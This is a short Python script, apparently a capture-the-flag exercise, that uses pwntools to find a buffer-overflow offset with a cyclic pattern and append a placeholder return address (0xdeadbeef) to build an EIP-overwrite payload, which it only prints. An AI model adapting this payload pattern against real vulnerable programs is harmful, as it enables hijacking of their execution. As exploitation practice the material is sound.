#!/usr/bin/env python
import sys
from pwn import *

padding = cyclic(100)
print ("padding : " + str(padding))
padding = cyclic(cyclic_find('jaaa'))
print ("padding_cyclic : " + str(padding))
eip = p32(0xdeadbeef)

payload = padding + eip

print("payload " +str(payload))